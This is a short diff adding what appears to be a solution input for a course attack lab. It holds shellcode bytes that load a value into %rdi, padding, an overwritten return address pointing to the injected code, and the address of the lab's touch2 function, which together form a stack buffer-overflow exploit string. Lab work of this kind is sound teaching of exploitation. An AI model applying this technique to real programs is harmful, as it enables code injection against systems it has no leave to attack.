@@ -1,0 +1,8 @@
+/* Byte code for shell code 'movq $0x754e7ddd,%rdi; ret' */
+48 c7 c7 dd 7d 4e 75 c3 
+/* Pad with 16 bytes */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+/* Address of shellcode */
+f8 53 64 55 00 00 00 00 
+/* Address of touch2 */
+90 1b 40 00 00 00 00 00 
